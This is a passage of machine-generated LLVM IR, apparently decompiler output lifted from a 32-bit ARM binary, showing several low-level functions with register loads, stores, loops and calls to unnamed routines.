  %v0_d404 = load i32, i32* %r3.global-to-local, align 4
  %v1_d404 = load i32, i32* @r8, align 4
  %v2_d404 = add i32 %v1_d404, 16
  %v3_d404 = inttoptr i32 %v2_d404 to i32*
  store i32 %v0_d404, i32* %v3_d404, align 4
  br i1 %v2_d3ec, label %dec_label_pc_d498, label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %bb38
  %v2_d40c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d40c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18128.274 to i32), i32* %r2.global-to-local, align 4
  %v1_d424 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_18128.274 to i32), i32* %r0.global-to-local, align 4
  %v1_d434 = call i32 @function_10838()
  store i32 ptrtoint (i32* @global_var_18110.313 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_d1e8, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  %v1_d448 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_18110.313 to i32), i32* %r0.global-to-local, align 4
  %v1_d454 = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r2.global-to-local, align 4
  %v2_d45c = load i32, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  store i32 %v2_d45c, i32* %r3.global-to-local, align 4
  store i32 %v2_d1e8, i32* @r0, align 4
  %v1_d464 = load i32, i32* @r8, align 4
  %v2_d464 = add i32 %v1_d464, 32
  %v3_d464 = inttoptr i32 %v2_d464 to i32*
  store i32 %v2_d45c, i32* %v3_d464, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d470 = load i32, i32* @r8, align 4
  %v1_d470 = load i32, i32* %r2.global-to-local, align 4
  %v2_d470 = inttoptr i32 %v1_d470 to i32*
  store i32 %v0_d470, i32* %v2_d470, align 4
  %v1_d478 = call i32 @function_10840()
  store i32 %v2_d40c, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 54416, i32* @lr, align 4
  %v1_d48c = call i32 @function_10840()
  store i32 %v1_d48c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d498

dec_label_pc_d494:                                ; preds = %dec_label_pc_d228, %dec_label_pc_d214, %dec_label_pc_d234
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_d498

dec_label_pc_d498:                                ; preds = %bb38, %dec_label_pc_d26c, %dec_label_pc_d40c, %dec_label_pc_d494
  %v0_d498 = load i32, i32* @r8, align 4
  store i32 %v0_d498, i32* %r0.global-to-local, align 4
  %v2_d4a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d4a0, i32* @r4, align 4
  store i32 %v6_d1dc, i32* @r5, align 4
  store i32 %v9_d1dc, i32* @r6, align 4
  store i32 %v15_d1dc, i32* @r8, align 4
  ret i32 %v0_d498

; uselistorder directives
  uselistorder i32 %v1_d3c0.pre, { 1, 0, 2 }
  uselistorder i32 %v3_d388, { 1, 0 }
  uselistorder i32 %v3_d31c1, { 1, 0 }
  uselistorder i32 %v0_d2fc, { 1, 0 }
  uselistorder i1 %v7_d2f0, { 1, 0 }
  uselistorder i32 %v1_d2c0, { 1, 0 }
  uselistorder i32 %v0_d2c0, { 1, 0 }
  uselistorder i32 %v1_d2a8, { 1, 0, 2 }
  uselistorder i32 %v1_d25c, { 1, 0 }
  uselistorder i32 %v0_d228, { 1, 0, 2 }
  uselistorder i1 %v7_d208, { 1, 0 }
  uselistorder i1 %v7_d1fc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 5, 6, 7, 9, 8, 10, 12, 11, 14, 13, 16, 15, 21, 20, 17, 2, 18, 19, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_d498, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d494, { 2, 0, 1 }
  uselistorder label %bb38, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_d2f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d298, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d214, { 1, 2, 0 }
}

define i32 @function_d4a4(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d4a4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_d4a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d4a4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_d4a4
  %v3_d4ac = and i32 %arg4, %arg3
  store i32 %v3_d4ac, i32* %r0.global-to-local, align 4
  %v2_d4b0 = trunc i32 %v3_d4ac to i16
  %v4_d4b0 = inttoptr i32 %v3_d4ac to i16*
  store i16 %v2_d4b0, i16* %v4_d4b0, align 2
  %v5_d4b0 = load i32, i32* @r6, align 4
  %v6_d4b0 = load i32, i32* %r0.global-to-local, align 4
  %v7_d4b0 = sub i32 %v6_d4b0, %v5_d4b0
  store i32 %v7_d4b0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d4a4, %bb
  %v8_d4b0 = phi i32 [ %tmp, %dec_label_pc_d4a4 ], [ %v7_d4b0, %bb ]
  ret i32 %v8_d4b0

; uselistorder directives
  uselistorder i32 %v3_d4ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_d4d4() local_unnamed_addr {
dec_label_pc_d4d4:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d4d4 = load i32, i32* @r4, align 4
  store i32 %v3_d4d4, i32* %stack_var_-24, align 4
  %v9_d4d4 = load i32, i32* @r6, align 4
  %v0_d4d8 = call i32 @function_cc08()
  store i32 ptrtoint (i8** @global_var_18144.264 to i32), i32* @r4, align 4
  %v3_d4e0 = load i8, i8* @global_var_18145.319, align 1
  %v4_d4e0 = zext i8 %v3_d4e0 to i32
  store i32 %v4_d4e0, i32* @r3, align 4
  %v2_d4e4 = load i8, i8* bitcast (i8** @global_var_18144.264 to i8*), align 4
  %v3_d4e4 = zext i8 %v2_d4e4 to i32
  store i32 %v0_d4d8, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_d4f0 = mul nuw nsw i32 %v4_d4e0, 256
  %v5_d4f0 = or i32 %v3_d4e4, %v4_d4f0
  store i32 %v5_d4f0, i32* @r6, align 4
  %v1_d4f4 = inttoptr i32 %v0_d4d8 to i32*
  %v2_d4f4 = load i32, i32* %v1_d4f4, align 4
  store i32 %v2_d4f4, i32* %r8.global-to-local, align 4
  %v1_d4f8 = call i32 @function_f1ac(i32 0)
  %v1_d4fc = sub i32 1, %v1_d4f8
  %v0_d500 = load i32, i32* @r6, align 4
  %v4_d500 = mul i32 %v1_d4fc, 256
  %v5_d500 = xor i32 %v4_d500, %v0_d500
  %v3_d504 = load i8, i8* @global_var_18195.320, align 1
  %v4_d504 = zext i8 %v3_d504 to i32
  store i32 %v4_d504, i32* @r3, align 4
  %v3_d508 = load i8, i8* @global_var_18194.265, align 1
  %v4_d508 = zext i8 %v3_d508 to i32
  %v3_d50c = sdiv i32 %v5_d500, 256
  store i32 1, i32* @r0, align 4
  %v4_d514 = mul nuw nsw i32 %v4_d504, 256
  %v5_d514 = or i32 %v4_d508, %v4_d514
  store i32 %v5_d514, i32* @r5, align 4
  %v1_d518 = trunc i32 %v3_d50c to i8
  store i8 %v1_d518, i8* @global_var_18145.319, align 1
  %v1_d51c = trunc i32 %v0_d500 to i8
  %v2_d51c = load i32, i32* @r4, align 4
  %v3_d51c = inttoptr i32 %v2_d51c to i8*
  store i8 %v1_d51c, i8* %v3_d51c, align 1
  %v1_d520 = call i32 @function_f1ac(i32 1)
  %v1_d524 = sub i32 1, %v1_d520
  %v0_d528 = load i32, i32* @r5, align 4
  %v4_d528 = mul i32 %v1_d524, 256
  %v5_d528 = xor i32 %v4_d528, %v0_d528
  store i32 %v5_d528, i32* %r5.global-to-local, align 4
  %v3_d52c = sdiv i32 %v5_d528, 256
  %v1_d530 = trunc i32 %v3_d52c to i8
  store i8 %v1_d530, i8* @global_var_18195.320, align 1
  %v0_d534 = load i32, i32* %r8.global-to-local, align 4
  %v1_d534 = load i32, i32* @r7, align 4
  %v2_d534 = inttoptr i32 %v1_d534 to i32*
  store i32 %v0_d534, i32* %v2_d534, align 4
  %v0_d538 = load i32, i32* %r5.global-to-local, align 4
  %v1_d538 = trunc i32 %v0_d538 to i8
  store i8 %v1_d538, i8* @global_var_18194.265, align 1
  %v2_d53c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d53c, i32* @r4, align 4
  store i32 %v9_d4d4, i32* @r6, align 4
  ret i32 %v1_d524

; uselistorder directives
  uselistorder i32 %v1_d524, { 1, 0 }
  uselistorder i32 %v0_d500, { 1, 0 }
  uselistorder i8* @global_var_18194.265, { 1, 0 }
  uselistorder i8* @global_var_18195.320, { 1, 0 }
  uselistorder i32 (i32)* @function_f1ac, { 1, 0, 2 }
  uselistorder i8* @global_var_18145.319, { 1, 0 }
}

define i32 @function_d544() local_unnamed_addr {
dec_label_pc_d544:
  store i32 ptrtoint (i32* @global_var_16954.322 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_d54c = call i32 @function_ec10()
  %v0_d550 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d550, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_d544
  %v1_d550 = load i32, i32* @r1, align 4
  %v2_d550 = load i32, i32* @r4, align 4
  %v3_d550 = load i32, i32* @sb, align 4
  %v8_d550 = ashr i32 %v2_d550, %v3_d550
  %v9_d550 = and i32 %v8_d550, %v1_d550
  store i32 %v9_d550, i32* @r6, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_d544, %bb
  ret i32 %v0_d54c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_d554() local_unnamed_addr {
dec_label_pc_d554:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d554 = load i32, i32* @r4, align 4
  store i32 %v3_d554, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_18110.313 to i32), i32* @r0, align 4
  %v0_d55c = call i32 @function_d544()
  store i32 ptrtoint (i32* @global_var_18128.274 to i32), i32* @r0, align 4
  %v0_d564 = call i32 @function_d544()
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_d5c06 = add i32 %storemerge5, 56
  store i32 %v1_d5c06, i32* @r5, align 4
  %v2_d5c48 = icmp eq i32 %storemerge5, 0
  store i32 %v1_d5c06, i32* %r0.global-to-local, align 4
  br i1 %v2_d5c48, label %dec_label_pc_d5d0, label %dec_label_pc_d574

dec_label_pc_d574:                                ; preds = %dec_label_pc_d554, %dec_label_pc_d5b0
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 54656, i32* @lr, align 4
  %v1_d57c = call i32 @function_10838()
  %v2_d580 = icmp eq i32 %v1_d57c, 0
  %v0_d584 = load i32, i32* @r5, align 4
  store i32 %v0_d584, i32* @r0, align 4
  br i1 %v2_d580, label %dec_label_pc_d5b0, label %dec_label_pc_d58c

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d574
  %v0_d58c = load i32, i32* @r4, align 4
  %v1_d58c = add i32 %v0_d58c, 8
  %v2_d58c = inttoptr i32 %v1_d58c to i32*
  %v3_d58c = load i32, i32* %v2_d58c, align 4
  store i32 %v3_d58c, i32* %r3.global-to-local, align 4
  %v3_d594 = inttoptr i32 %v0_d58c to i8*
  store i8 48, i8* %v3_d594, align 1
  %v2_d59c = load i32, i32* @r4, align 4
  %v3_d59c = add i32 %v2_d59c, 1
  %v4_d59c = inttoptr i32 %v3_d59c to i8*
  store i8 0, i8* %v4_d59c, align 1
  %v0_d5a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a0 = load i32, i32* @r4, align 4
  %v2_d5a0 = add i32 %v1_d5a0, 20
  %v3_d5a0 = inttoptr i32 %v2_d5a0 to i32*
  store i32 %v0_d5a0, i32* %v3_d5a0, align 4
  %v0_d5a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a4 = load i32, i32* @r4, align 4
  %v2_d5a4 = add i32 %v1_d5a4, 24
  %v3_d5a4 = inttoptr i32 %v2_d5a4 to i32*
  store i32 %v0_d5a4, i32* %v3_d5a4, align 4
  %v0_d5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a8 = load i32, i32* @r4, align 4
  %v2_d5a8 = add i32 %v1_d5a8, 28
  %v3_d5a8 = inttoptr i32 %v2_d5a8 to i32*
  store i32 %v0_d5a8, i32* %v3_d5a8, align 4
  %v0_d5ac = load i32, i32* %r3.global-to-local, align 4
  %v1_d5ac = load i32, i32* @r4, align 4
  %v2_d5ac = add i32 %v1_d5ac, 16
  %v3_d5ac = inttoptr i32 %v2_d5ac to i32*
  store i32 %v0_d5ac, i32* %v3_d5ac, align 4
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d574, %dec_label_pc_d58c
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d5b4 = load i32, i32* @r4, align 4
  %v2_d5b4 = add i32 %v1_d5b4, 52
  %v3_d5b4 = inttoptr i32 %v2_d5b4 to i32*
  store i32 1, i32* %v3_d5b4, align 4
  %v0_d5b8 = call i32 @function_d544()
  store i32 %v0_d5b8, i32* %r0.global-to-local, align 4
  %v0_d5bc = load i32, i32* @r4, align 4
  %v1_d5bc = add i32 %v0_d5bc, 32
  %v2_d5bc = inttoptr i32 %v1_d5bc to i32*
  %storemerge = load i32, i32* %v2_d5bc, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_d5c0 = add i32 %storemerge, 56
  store i32 %v1_d5c0, i32* @r5, align 4
  %v2_d5c4 = icmp eq i32 %storemerge, 0
  store i32 %v1_d5c0, i32* %r0.global-to-local, align 4
  br i1 %v2_d5c4, label %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge, label %dec_label_pc_d574

dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge:    ; preds = %dec_label_pc_d5b0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge, %dec_label_pc_d554
  %v11_d5f813 = phi i32 [ %v1_d5c0, %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge ], [ %v1_d5c06, %dec_label_pc_d554 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge ], [ 0, %dec_label_pc_d554 ]
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_d5f04 = icmp eq i32 %storemerge12, 0
  br i1 %v2_d5f04, label %dec_label_pc_d5f8, label %dec_label_pc_d5dc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d5d0, %dec_label_pc_d5dc
  %v0_d5e4 = phi i32 [ %storemerge1, %dec_label_pc_d5dc ], [ %storemerge12, %dec_label_pc_d5d0 ]
  %v1_d5dc = inttoptr i32 %v0_d5e4 to i8*
  %v2_d5dc = load i8, i8* %v1_d5dc, align 1
  %v3_d5dc = zext i8 %v2_d5dc to i32
  store i32 %v3_d5dc, i32* %r3.global-to-local, align 4
  %v1_d5e0 = and i32 %v3_d5dc, 64
  store i32 %v0_d5e4, i32* %r0.global-to-local, align 4
  store i32 54764, i32* @lr, align 4
  %v1_d5e8 = icmp ne i32 %v1_d5e0, 0
  call void @__pseudo_cond_branch(i1 %v1_d5e8, i32 ptrtoint (i32* @global_var_d60c.327 to i32))
  %v0_d5ec = load i32, i32* %r4.global-to-local, align 4
  %v1_d5ec = add i32 %v0_d5ec, 32
  %v2_d5ec = inttoptr i32 %v1_d5ec to i32*
  %storemerge1 = load i32, i32* %v2_d5ec, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_d5f0 = icmp eq i32 %storemerge1, 0
  br i1 %v2_d5f0, label %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge, label %dec_label_pc_d5dc

dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge:    ; preds = %dec_label_pc_d5dc
  %v11_d5f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d5f8

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge, %dec_label_pc_d5d0
  %v11_d5f8 = phi i32 [ %v11_d5f8.pre, %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge ], [ %v11_d5f813, %dec_label_pc_d5d0 ]
  %v2_d5f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d5f8, i32* @r4, align 4
  ret i32 %v11_d5f8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @function_d544, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d5dc, { 1, 0 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_d574, { 1, 0 }
}

define i32 @function_d60c() local_unnamed_addr {
dec_label_pc_d60c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d60c = load i32, i32* @r4, align 4
  store i32 %v3_d60c, i32* %stack_var_-8, align 4
  %v0_d610 = load i32, i32* @r0, align 4
  %v1_d610 = add i32 %v0_d610, 8
  %v2_d610 = inttoptr i32 %v1_d610 to i32*
  %v3_d610 = load i32, i32* %v2_d610, align 4
  %v1_d614 = add i32 %v0_d610, 16
  %v2_d614 = inttoptr i32 %v1_d614 to i32*
  %v3_d614 = load i32, i32* %v2_d614, align 4
  %v9_d618 = icmp eq i32 %v3_d614, %v3_d610
  store i32 %v0_d610, i32* %r4.global-to-local, align 4
  br i1 %v9_d618, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d60c
  store i32 %v3_d610, i32* %v2_d614, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_d60c, %bb
  store i32 54828, i32* @lr, align 4
  %v1_d628 = xor i1 %v9_d618, true
  call void @__pseudo_cond_branch(i1 %v1_d628, i32 ptrtoint (i32* @global_var_11174.328 to i32))
  %v0_d62c = load i32, i32* %r4.global-to-local, align 4
  %v1_d62c = add i32 %v0_d62c, 8
  %v2_d62c = inttoptr i32 %v1_d62c to i32*
  %v3_d62c = load i32, i32* %v2_d62c, align 4
  %v1_d630 = add i32 %v0_d62c, 16
  %v2_d630 = inttoptr i32 %v1_d630 to i32*
  %v3_d630 = load i32, i32* %v2_d630, align 4
  %v2_d634 = sub i32 %v3_d630, %v3_d62c
  %v2_d638 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d638, i32* @r4, align 4
  ret i32 %v2_d634

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_d63c(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d63c:
  %stack_var_-17 = alloca i8, align 1
  %v3_d63c = load i32, i32* @r4, align 4
  %v6_d63c = load i32, i32* @r5, align 4
  %v9_d63c = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_d65c2 = icmp eq i32 %arg3, 0
  %v2_d660 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_d65c2, label %dec_label_pc_d67c, label %dec_label_pc_d670

dec_label_pc_d658:                                ; preds = %dec_label_pc_d670
  %v1_d658 = add i32 %v0_d658, -1
  store i32 %v1_d658, i32* @r4, align 4
  %v2_d65c = icmp eq i32 %v1_d658, 0
  %v0_d668 = load i32, i32* @r6, align 4
  br i1 %v2_d65c, label %dec_label_pc_d67c.loopexit, label %dec_label_pc_d670

dec_label_pc_d670:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d658
  %v0_d6684 = phi i32 [ %v0_d668, %dec_label_pc_d658 ], [ %arg1, %dec_label_pc_d63c ]
  %v3_d670 = call i32 @function_11230(i32 %v2_d660, i32 1, i32 %v0_d6684)
  %v7_d674 = icmp eq i32 %v3_d670, 1
  %v0_d658 = load i32, i32* @r4, align 4
  br i1 %v7_d674, label %dec_label_pc_d658, label %dec_label_pc_d67c.loopexit

dec_label_pc_d67c.loopexit:                       ; preds = %dec_label_pc_d658, %dec_label_pc_d670
  %v0_d67c.ph = phi i32 [ %v0_d658, %dec_label_pc_d670 ], [ 0, %dec_label_pc_d658 ]
  %v1_d67c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d67c.loopexit, %dec_label_pc_d63c
  %v1_d67c = phi i32 [ 0, %dec_label_pc_d63c ], [ %v1_d67c.pre, %dec_label_pc_d67c.loopexit ]
  %v0_d67c = phi i32 [ 0, %dec_label_pc_d63c ], [ %v0_d67c.ph, %dec_label_pc_d67c.loopexit ]
  %v2_d67c = sub i32 %v1_d67c, %v0_d67c
  store i32 %v3_d63c, i32* @r4, align 4
  store i32 %v6_d63c, i32* @r5, align 4
  store i32 %v9_d63c, i32* @r6, align 4
  ret i32 %v2_d67c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d67c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d670, { 1, 0 }
}

define i32 @function_d688(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d688:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d688 = load i32, i32* @r4, align 4
  store i32 %v3_d688, i32* %stack_var_-24, align 4
  %v9_d688 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_d690 = and i32 %arg2, 128
  %v2_d690 = icmp eq i32 %v1_d690, 0
  %v0_d694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d694, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_d690, label %bb, label %dec_label_pc_d6a8

bb:                                               ; preds = %dec_label_pc_d688
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d688
  store i32 %arg4, i32* @r0, align 4
  %v0_d6ac = call i32 @function_ecc0()
  store i32 %v0_d6ac, i32* %r0.global-to-local, align 4
  %v1_d6b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d6b0 = sub i32 %v1_d6b0, %v0_d6ac
  store i32 %v2_d6b0, i32* @r4, align 4
  store i32 %v0_d6ac, i32* @r5, align 4
  %tmp15 = icmp slt i32 %v2_d6b0, 1
  br i1 %tmp15, label %.thread, label %dec_label_pc_d6c8

.thread:                                          ; preds = %dec_label_pc_d6a8
  store i32 %v0_d6ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6a8
  %v0_d6c8 = load i32, i32* @r6, align 4
  %v1_d6c8 = urem i32 %v0_d6c8, 128
  %v0_d6cc = load i32, i32* @r8, align 4
  store i32 %v0_d6cc, i32* %r0.global-to-local, align 4
  %v3_d6d4 = trunc i32 %v1_d6c8 to i8
  %v4_d6d4 = call i32 @function_d63c(i32 %v0_d6cc, i8 %v3_d6d4, i32 %v2_d6b0)
  store i32 %v4_d6d4, i32* %r0.global-to-local, align 4
  %v1_d6d8 = load i32, i32* @r4, align 4
  %v9_d6d8 = icmp eq i32 %v4_d6d4, %v1_d6d8
  store i32 %v4_d6d4, i32* %r6.global-to-local, align 4
  br i1 %v9_d6d8, label %dec_label_pc_d6e4, label %dec_label_pc_d704

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6c8
  %v0_d6e4 = load i32, i32* @r5, align 4
  store i32 %v0_d6e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6e8:                                ; preds = %bb, %.thread, %dec_label_pc_d6e4
  %v5_d6f4 = phi i32 [ %v0_d6e4, %dec_label_pc_d6e4 ], [ %arg3, %bb ], [ %v0_d6ac, %.thread ]
  %tmp16 = icmp slt i32 %v5_d6f4, 1
  br i1 %tmp16, label %.thread8, label %bb17

.thread8:                                         ; preds = %dec_label_pc_d6e8
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_d6e8
  %v5_d6f0 = load i32, i32* @r7, align 4
  br label %bb18

bb18:                                             ; preds = %.thread8, %bb17
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_d6f0, %bb17 ]
  %tmp19 = phi i1 [ false, %.thread8 ], [ true, %bb17 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp19, i32 ptrtoint (i32* @global_var_11230.329 to i32))
  %v0_d700 = load i32, i32* %r6.global-to-local, align 4
  %v2_d700 = add i32 %storemerge, %v0_d700
  store i32 %v2_d700, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %dec_label_pc_d6c8, %bb18
  %v0_d704 = phi i32 [ %v4_d6d4, %dec_label_pc_d6c8 ], [ %v2_d700, %bb18 ]
  store i32 %v0_d704, i32* %r0.global-to-local, align 4
  %v2_d708 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d708, i32* %r4.global-to-local, align 4
  store i32 %v9_d688, i32* %r6.global-to-local, align 4
  ret i32 %v0_d704

; uselistorder directives
  uselistorder i32 %v0_d704, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_d704, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_d6e8, { 2, 1, 0 }
}

define i32 @function_d70c(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_d70c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d70c = load i32, i32* @r4, align 4
  store i32 %v3_d70c, i32* %stack_var_-36, align 4
  %v6_d70c = load i32, i32* @r5, align 4
  %v15_d70c = load i32, i32* @r8, align 4
  %v18_d70c = load i32, i32* @sb, align 4
  %v21_d70c = load i32, i32* @sl, align 4
  %v24_d70c = load i32, i32* @fp, align 4
  %v2_d714 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_d714, i32* @r6, align 4
